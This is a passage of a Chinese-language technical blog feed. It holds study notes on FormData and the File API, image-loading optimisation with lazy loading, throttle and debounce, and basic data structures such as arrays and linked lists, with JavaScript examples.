表单序列化与formData"></a>4. 表单序列化与formData</h3><p>浏览器怎样把表单数据发送给服务器：</p><ul><li>对表单字段的名称和值进行URL编码，使用(&amp;)分隔。</li><li>不发送禁用的表单字段，不发送type为reset, button, image的<code>&lt;button&gt;和&lt;input&gt;</code></li><li>只发送勾选的复选框和单选按钮，多选选择框中每个选中的值单独一个条目</li></ul><p>XMLHttpRequest2为表单数据定义了formData类型，方便创建与表单格式相同的数据。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line">data.append(<span class="string">'name'</span>, <span class="string">'Nicholas'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据表单元素填入键值对</span></span><br><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData(<span class="built_in">document</span>.forms[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></p><p>创建了FormData的实例后，可以将它直接传给XHR的send()方法。使用FormData的方便之处体现在不必明确地在XHR对象上设置请求头部。XHR对象能够识别FormData的实例，并配置适当的头部信息。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  xhr.open(<span class="string">'post'</span>, <span class="string">'postexample.php'</span>, <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">'user-info'</span>);</span><br><span class="line">  xhr.send(<span class="keyword">new</span> FormData(form));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-File-API"><a href="#5-File-API" class="headerlink" title="5. File API"></a>5. File API</h3><h4 id="5-1-File对象"><a href="#5-1-File对象" class="headerlink" title="5.1 File对象"></a>5.1 File对象</h4><p>2000年前，处理文件的唯一方式是在表单中加入<code>&lt;input type=&quot;file&quot;&gt;</code>字段。后来HTML5在DOM中为文件输入元素添加了一个files集合。选择了一个或多个文件时，files集合中将包含一组File对象，每个File对象都有下列只读属性:</p><ul><li>name: 本地文件系统中的文件名</li><li>size: 文件的字节大小</li><li>type: 字符串，文件的MIME类型</li><li>lastModifiedDate: 字符串，文件上一次被修改的时间</li></ul><p>通过监听change事件并读取files集合就可以知道选择的每个文件的信息<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fileList = <span class="built_in">document</span>.getElementById(<span class="string">'files-list'</span>);</span><br><span class="line">EventUtil.addHanlder(fileList, <span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> file = event.files[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">console</span>.log(file.name + file.type + file.size + <span class="string">'bytes'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-使用XHR上传文件"><a href="#5-2-使用XHR上传文件" class="headerlink" title="5.2 使用XHR上传文件"></a>5.2 使用XHR上传文件</h4><p>将文件拖进浏览器窗口，调用append()方法传入相应的file对象，再把FormData对象传递给XHR的send()方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> droptarget = <span class="built_in">document</span>.getElementById(<span class="string">'droptarget'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleEvent</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event.preventDefault(event);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (event.type == <span class="string">'drop'</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> data = <span class="keyword">new</span> FormData();</span><br><span class="line">    <span class="keyword">var</span> files = event.dataTransfer.files;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.length; i++)&#123;</span><br><span class="line">      data.append(<span class="string">"file"</span> + i, files[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">"post"</span>, <span class="string">"FileAPIExample06Upload.php"</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.send(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EventUtil.addHandler(droptarget, <span class="string">"dragenter"</span>, handleEvent);</span><br><span class="line">EventUtil.addHandler(droptarget, <span class="string">"dragover"</span>, handleEvent);</span><br><span class="line">EventUtil.addHandler(droptarget, <span class="string">"drag"</span>, handleEvent);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-FileReader类型"><a href="#5-3-FileReader类型" class="headerlink" title="5.3 FileReader类型"></a>5.3 FileReader类型</h4><p>FileReader是一种异步文件读取机制，FileReader提供了如下几个方法:</p><ul><li>readAsText(file, encoding): 以纯文本形式读取文件，将读取到的文本保存在result属性中。</li><li>readAsDataURL(file): 读取文件并将文件以数据URI的形式保存在result属性中。</li><li>readAsBinaryString(file)</li><li>readAsArrayBuffer(file)<br>略</li></ul><p><br></p><h3 id="6-富文本编辑"><a href="#6-富文本编辑" class="headerlink" title="6. 富文本编辑"></a>6. 富文本编辑</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frames[<span class="string">"richedit"</span>].document.designMode = <span class="string">"on"</span>;</span><br></pre></td></tr></table></figure><p>略</p><p><br></p><p><a href="https://juejin.im/post/5c9ac607f265da6103588b31" target="_blank" rel="noopener">https://juejin.im/post/5c9ac607f265da6103588b31</a><br><a href="https://juejin.im/post/5b55c118f265da0f6f1aa354" target="_blank" rel="noopener">https://juejin.im/post/5b55c118f265da0f6f1aa354</a></p>]]></content>
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>节流与去抖 —— 图片加载优化</title>
      <link href="/2019/03/26/%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%8C%96/"/>
      <url>/2019/03/26/%E7%BD%91%E9%A1%B5%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%8C%96/</url>
      <content type="html"><![CDATA[<h3 id="1-问题"><a href="#1-问题" class="headerlink" title="1. 问题"></a>1. 问题</h3><p>elitemba主站 以图片展示为主，启动页面时加载过多图片，图片体积过大，导致等待时间过长。这些图片请求几乎是并发的。在Chrome浏览器，同一域名，最多支持6个请求的并发，其他的请求将会推入到队列中等待，直到6个请求中的一个完成后，队列中的新请求才会发出。</p><p>下面列出一些图片加载优化方法。</p><p><br></p><h3 id="1-压缩图片体积"><a href="#1-压缩图片体积" class="headerlink" title="1. 压缩图片体积"></a>1. 压缩图片体积</h3><h4 id="1-1-图片格式"><a href="#1-1-图片格式" class="headerlink" title="1.1 图片格式"></a>1.1 图片格式</h4><p>Web图片格式有JPEG/JPG、PNG、WebP、Base64、SVG等。</p><p><em>JPEG/JPG</em><br><strong>有损压缩、体积小、不支持透明。</strong>当我们把图片体积压缩至原有体积的 50% 以下时，JPG 仍然可以保持住 60% 的品质。此外，JPG 格式以 24 位存储单个图，可以呈现多达 1600 万种颜色。JPG 适用于呈现色彩丰富的图片，在我们日常开发中，JPG 图片经常作为大的背景图、轮播图或 Banner 图出现。</p><p>但它处理矢量图形和logo等线条感较强、颜色对比强烈的图像时，人为压缩导致的图片模糊会相当明显。</p><p><em>PNG-8/PNG-24</em><br><strong>无损压缩、质量高、体积大、支持透明</strong> PNG是一种无损压缩的高保真的图片格式，8位PNG支持256中颜色，24位可呈现1600万中颜色。考虑到 PNG 在处理线条和颜色对比度方面的优势，我们主要用它来呈现小的 Logo、颜色简单且对比强烈的图片或背景。</p><p><em>SVG</em><br><strong>文本文件、体积小、不失真、兼容性好</strong>SVG是一种基于XML语法的图像格式，它对图像的处理不是基于像素点，而是基于对图像的形状描述。它的优势是图片可无线放大而不失真。因为SVG是文本文件，我们可以像写代码一样定义SVG，把它写在HTML里、成为DOM的一部分。</p><p><em>Base64</em><br>Base64不是一种图片格式，而是一种编码方式，作为小图标解决方案而存在。通过对图片进行baser64编码，我们可以直接将编码结果写入HTML或者CSS，从而减少HTTP请求的次数。</p><p><em>WebP</em><br>它于 2010 年被提出， 是Google专为Web开发的一种旨在加快图片加载速度的图片格式，它支持有损压缩和无损压缩。与png相比，WebP无损图像的大小可以缩小26%，比同类jpeg小25-36%。</p><p><br></p><h4 id="1-2-图片裁剪"><a href="#1-2-图片裁剪" class="headerlink" title="1.2 图片裁剪"></a>1.2 图片裁剪</h4><ul><li>阿里云oss图片服务 / 七牛图片服务，提供了图片格式转换、按尺寸裁剪等图片处理功能。配合<code>lib-flexible</code>，就可以对不同设备加载不同尺寸的图片。</li></ul><p><br></p><h3 id="2-占位显示"><a href="#2-占位显示" class="headerlink" title="2. 占位显示"></a>2. 占位显示</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">padding-top</span>: <span class="number">60%</span>;  <span class="comment">/* 图片比例 */</span></span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#ccc</span> no-repeat center center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;img src="1.png"&gt;</span><br></pre></td></tr></table></figure><p>pc上，一般我们会为<code>&lt;img&gt;</code>设置width和height属性来解决图片占位问题。但在移动端，用占位图或min-height来占位，如果与需要加载的图片尺寸差别很大，会出现页面的内容跳动，这也不是我们想要的。</p><p><br><br><br></p><h3 id="3-懒加载"><a href="#3-懒加载" class="headerlink" title="3. 懒加载"></a>3. 懒加载</h3><p>滚动到可视区域后再去加载图片<br><br></p><h4 id="3-1-原理"><a href="#3-1-原理" class="headerlink" title="3.1 原理"></a>3.1 原理</h4><p>将页面中<code>&lt;img&gt;</code>的<code>src</code>指向一张默认图，然后定义<code>data-src</code>指向真实的图片。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 注意: 图片要指定宽高 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"default.jpg"</span> <span class="attr">data-src</span>=<span class="string">"http://www.elitemba.cn/static/images/1.png"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>当载入页面时，先把可视区域内的<code>&lt;img&gt;</code>标签的<code>data-src</code>属性值赋给<code>src</code>。然后监听滚动事件，同理修改可视区域的图片的src值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'img'</span>);</span><br><span class="line"><span class="keyword">var</span> num = img.length;</span><br><span class="line"><span class="keyword">var</span> n = <span class="number">0</span>;  <span class="comment">// 存储图片加载到的位置，避免每次都从第一张图片开始遍历</span></span><br><span class="line"></span><br><span class="line">lazyload(); <span class="comment">// 页面载入完毕加载可视区域内的图片</span></span><br><span class="line"><span class="built_in">window</span>.onscroll = lazyload;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lazyload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> seeHeight = <span class="built_in">document</span>.documentElement.clientHeight; <span class="comment">// 可见区域高度</span></span><br><span class="line">  <span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.documentElement.scrollTop || <span class="built_in">document</span>.body.scrollTop; <span class="comment">// 滚动条距离顶部高度</span></span><br><span class="line">  <span class="keyword">for</span> ( <span class="keyword">var</span> i = n ; i &lt; num; i++ )&#123;</span><br><span class="line">    <span class="keyword">if</span> (img[i].offsetTop &lt; seeHeight + scrollTop)&#123;</span><br><span class="line">      <span class="keyword">if</span> (img[i].getAttribute(<span class="string">"src"</span>) == <span class="string">"default.jpg"</span>)&#123;</span><br><span class="line">        img[i].src = img[i].getAttribute(<span class="string">"data-src"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      n = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-2-节流函数"><a href="#3-2-节流函数" class="headerlink" title="3.2 节流函数"></a>3.2 节流函数</h4><p>当函数绑定在<code>scroll</code>事件上，页面滚动时，函数会被高频触发，这非常影响浏览器的性能。这时需要限制触发频率。<br><strong>节流函数: 只允许一个函数在n秒内执行一次</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fun 要执行的函数</span></span><br><span class="line"><span class="comment">// time 在time时间内必须执行一次</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fun, time</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> startTime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>,</span><br><span class="line">        args = <span class="built_in">arguments</span>,</span><br><span class="line">        curTime = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果达到了规定的触发时间间隔，触发handler</span></span><br><span class="line">    <span class="keyword">if</span> ( curTime - startTime &gt;= time )&#123;</span><br><span class="line">      fun.apply(context, args);</span><br><span class="line">      startTime = curTime;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"scroll"</span>, throttle(lazy, <span class="number">1000</span>))</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-3-去抖函数"><a href="#3-3-去抖函数" class="headerlink" title="3.3 去抖函数"></a>3.3 去抖函数</h4><p>让函数延迟执行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, delay</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> time = <span class="literal">null</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">    clearTimeout(time);</span><br><span class="line">    timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      fn.apply(context, args)</span><br><span class="line">    &#125;, delay)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 让函数延迟500s执行</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"scroll"</span>, debounce(lazyload, <span class="number">500</span>))</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-骨架屏"><a href="#4-骨架屏" class="headerlink" title="4. 骨架屏"></a>4. 骨架屏</h3><p>骨架屏可以理解为<em>当数据还未加载进来前，页面的一个空白版本</em>。页面渲染完成之前，用户会看到当前页面的大致骨架。</p><p>下面的示例图，第一个是骨架屏，第二个是菊花图，第三个无优化。<br><br><br><img src="/2019/03/26/网页图片加载优化/2.gif" style="max-width: 800px"><br><br></p><p>生成骨架屏的方式: </p><ul><li>手写HTML，CSS定制骨架屏，但是维护成本高</li><li>使用图片作为骨架屏： 小米商城的移动端页面</li><li>自动生成并自动插入静态骨架屏 page-skeleton-webpack-plugin</li></ul><p><br></p><h3 id="5-渐进式图片加载"><a href="#5-渐进式图片加载" class="headerlink" title="5. 渐进式图片加载"></a>5. 渐进式图片加载</h3><p>知乎会用低分辨的模糊图片来做预览图，代替懒加载图片时用的logo占位图，预览图大小在2kb-3kb之间。<br><img src="/2019/03/26/网页图片加载优化/1.gif"></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/33370207" target="_blank" rel="noopener">网页图片加载优化方案</a></li><li><a href="https://github.com/Jocs/jocs.github.io/issues/22" target="_blank" rel="noopener">一种自动化生成骨架屏的方案</a></li><li><a href="https://juejin.im/post/5b79a2786fb9a01a18267362" target="_blank" rel="noopener">Vue项目骨架屏注入实践</a></li><li><a href="https://github.com/ccforward/cc/issues/64" target="_blank" rel="noopener">适用于vue.js和原生js的渐进式图片加载</a></li><li><a href="https://juejin.im/post/583b10640ce463006ba2a71a" target="_blank" rel="noopener">实现图片懒加载</a></li><li><a href="https://github.com/ElemeFE/page-skeleton-webpack-plugin" target="_blank" rel="noopener">page-skeleton-webpack-plugin</a></li><li><a href="https://www.jianshu.com/p/a5fd143c6184" target="_blank" rel="noopener">CSS实现图片未加载完成时占位显示</a></li><li><a href="https://lq1228.github.io/front/article/2016/11/24/layout-image.html" target="_blank" rel="noopener">CSS实现 图片加载前的占位高度预设</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>数据结构与算法总览</title>
      <link href="/2019/03/14/LeetCode-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%80%BB%E8%A7%88/"/>
      <url>/2019/03/14/LeetCode-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%80%BB%E8%A7%88/</url>
      <content type="html"><![CDATA[<blockquote><p>LeetCode JS题解: <a href="https://github.com/ufresh2013/-algorithm015" target="_blank" rel="noopener">https://github.com/ufresh2013/-algorithm015</a></p></blockquote><h3 id="1-时间复杂度、空间复杂度"><a href="#1-时间复杂度、空间复杂度" class="headerlink" title="1. 时间复杂度、空间复杂度"></a>1. 时间复杂度、空间复杂度</h3><p><code>O(1)</code>: 哈希表(JS对象)，根据key就可以直接拿到val<br><code>O(n)</code>: 大多数遍历，比如数数，从1数到100<br><code>O(n²)</code>:双重循环，比如排序(冒泡、选择)，每个元素都需要其他元素比较放置<br><code>O(logn)</code>: 二分查找/二叉树搜索，每次查找的范围都/2<br><code>O(nlogn)</code>: 快排<br><code>O(2^n)</code>: 递归</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.zhihu.com/question/21387264" target="_blank" rel="noopener">如何理解算法时间复杂度的表示法，例如 O(n²)、O(n)、O(1)、O(nlogn) 等？</a></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>数据结构与算法（小争哥）</title>
      <link href="/2019/03/14/LeetCode-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
      <url>/2019/03/14/LeetCode-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-数组"><a href="#1-数组" class="headerlink" title="1. 数组"></a>1. 数组</h3><p>数组(Array)是一种线性表数据结构。它用一组连续的内存空间，来存储一组相同类型的数据。</p><ul><li><p>线性表<br>线性表就是数据排成像一条线一样的结构。每个线性表上的数据最多只有前和后两个方向。除了数组，链表、队列、栈等都是线性表结构。<br><img src="/2019/03/14/LeetCode-数据结构与算法/1.jpg" style="max-width: 500px; margin-top: 20px"></p></li><li><p><em>随机访问</em><br>连续的内存空间和相同类型的数据。因为有了这个限制，它才有了一个堪称“杀手锏”的特性：<strong>随机访问</strong>。也因为这两个限制，让数组的很多操作变得非常低效，比如删除、插入一个数据，为了保证连续性，就需要做大量的数据搬移工作。</p></li><li><p>数组如何通过下标随机访问?<br>通过寻址共识，计算出存储元素的内存地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a[i]_address = base_address + i * data_type_size</span><br><span class="line"></span><br><span class="line">// 二位数组内存寻址</span><br><span class="line">对于m * n的数组, a[i][j]( i &lt; m, j &lt; n)的地址为</span><br><span class="line">a[i][j]_address = base_address + ( i * n + j ) * data_type_size</span><br></pre></td></tr></table></figure></li><li><p><em>低效的“插入”和“删除”</em><br><strong>为了保持内存数组的连续性</strong>，将一个数据插入到数组中的第k个位置，我们需要将第k~n这部分的元素都顺序往后挪以为。平均情况时间复杂度为(1+2+..+n)/n = O(n).</p></li><li><p>改进方法（舍弃数组的连续性）<br><em>快排</em>:  直接将第k位的数据搬移到数组元素的最后，把新的元素直接放入第k个位置。时间复杂度降为O(1)<br><em>JVM标记清除垃圾</em>:  删除操作，只是记录数据已经被删除。当数组没有更多空间存储数据时，才触发执行一次真正的删除操作。大大减少了数据搬移的次数。</p></li><li><p>数组的访问越界问题</p></li><li>为什么数组要从0开始编号?<br>如果从1开始编号，每次随机访问数组元素都多了一次减法运算。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 从0开始</span><br><span class="line">a[k]_address = base_address + k * type_size</span><br><span class="line"></span><br><span class="line">// 从1开始</span><br><span class="line">a[k]_address = base_address + ( k - 1 ) * type_size</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-链表"><a href="#2-链表" class="headerlink" title="2. 链表"></a>2. 链表</h3><p>数组需要一块连续的内存空间来存储，而链表恰恰相反，它并不需要一块连续的内存空间，它通过“指针”将一组<strong>零散的内存块</strong>串联起来使用。<br><img src="/2019/03/14/LeetCode-数据结构与算法/2.jpg" style="max-width: 500px; margin-top: 20px"></p><p><br></p><h4 id="2-1-单链表"><a href="#2-1-单链表" class="headerlink" title="2.1 单链表"></a>2.1 单链表</h4><p>为了将所有节点串起来，每个链表的节点除了存储数据之外，还需要记录链上的下一个结点的地址。我们把这个记录下个节点地址的指针叫作<strong>后续指针 next</strong>。<br><img src="/2019/03/14/LeetCode-数据结构与算法/3.jpg" style="max-width: 500px; margin: 20px auto"></p><p>与数组一样，链表也支持数据的查找、插入和删除。在链表中插入或者删除一个数据，我们并不需要为了保持内存的连续性而搬移结点，我们只需要考虑相邻结点的指针改变，时间复杂度是O(1)。<br><img src="/2019/03/14/LeetCode-数据结构与算法/4.jpg" style="max-width: 500px; margin: 20px auto"></p><p>但是，链表想要随机访问第k个元素，就无法像数组那样，通过寻址公式直接计算出对应的内存地址。而是需要根据指针一个结点一个结点地依次遍历，直到找到相应的结点，时间复杂度是O(n)。</p><p><br></p><ul><li><strong>循环链表</strong><br>单链表的尾结点指针指向空地址，来表示这是最后的结点。而循环链表的尾结点指向链表的头结点。</li></ul><p><br></p><h4 id="2-2-双向链表"><a href="#2-2-双向链表" class="headerlink" title="2.2 双向链表"></a>2.2 双向链表</h4><p>每个结点不止有一个后续指针<code>next</code>指向后面的结点，还有一个前驱指针<code>prev</code>指向签名的节点。<br><img src="/2019/03/14/LeetCode-数据结构与算法/5.jpg" style="max-width: 500px; margin: 20px auto"></p><ul><li><strong>相比单链表，双向链表适合解决哪种问题？</strong><br>在实际的开发中，从链表中删除一个数据无外乎这两种情况：<br><em>- 删除结点中“值等于某个给定值”的结点</em><br>此时，无论是单链表还是双链表，都需要从头结点一个个遍历对比，知道遭到给定值的结点。时间复杂度是O(n)。<br><em>- 删除给定指针指向的结点</em><br>删除某个结点需要知道其前驱结点，而单链表不能直接获取。为了找到前驱结点，我们还要从头结点开始遍历链表，知道p-&gt;next = q。时间复杂度为O(n)，而双向链表只需O(1)。</li></ul><p><br></p><ul><li><strong>有序链表</strong><br>对于有序链表，双向链表的按值查询的效率更高。我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定往前还是往后查找，平均只需要查找一半的数据。 Java LinkedHashMap</li></ul><p><br></p><ul><li><strong>实现LRU缓存淘汰算法</strong><blockquote><p>缓存是一种提高数据读取性能的技术，常见的有CPU缓存、数据库缓存、浏览器缓存等。缓存的大小有限，当缓存被用满时，哪些数据应该被清理，哪些数据应该被保留。这就需要缓存淘汰策略来决定。常见的策略有三种: 先进先出策略(FIFO - first in, first out), 最少使用策略(LFU - least frequently used), 最近最少使用策略(LRU - least recently used)。</p></blockquote></li></ul><p><em>实现思路: 越靠近尾部的结点是越早前访问的。</em></p><ol><li>维护一个有序单链表</li><li>当要访问一个数据时，我们从链表头开始遍历链表。<br>如果数据已经存在于链表中，将其从原来的文职删除，再插入到链表的头部。<br>如果数据不存在于链表中，此时缓存未满，将此结点直接插入到链表的头部。<br>如果数据不存在与链表中，此时缓存已满，则删除链表尾结点，将新数据插入链表的头部。</li></ol><p><br></p><ul><li><strong>判断一个字符串是否是回文字符串</strong><br>使用快慢两个指针找到链表中点，慢指针每次前进1步，快指针每次前进2步。在慢指针前进的过程中，同时修改其next指针，使得链表前半部分反序。最后比较中点两侧的链表是否相等。</li></ul><p><br></p><h4 id="2-3-指针的含义"><a href="#2-3-指针的含义" class="headerlink" title="2.3 指针的含义"></a>2.3 指针的含义</h4><p>有的语言有“指针”的概念，有的没有，取而代之的是“引用”。无论是“指针”还是“引用”，指的都是存储所指对象的内存位置。</p><p><em>将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量。</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// p结点的next指针存储了q结点的内存地址</span><br><span class="line">p-&gt;next=q</span><br><span class="line"></span><br><span class="line">// p结点的next指针存储了p结点的下下一个结点的内存地址</span><br><span class="line">p-&gt;next = p-&gt;next-&gt;next</span><br></pre></td></tr></table></figure><ul><li><p>单链表的插入删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 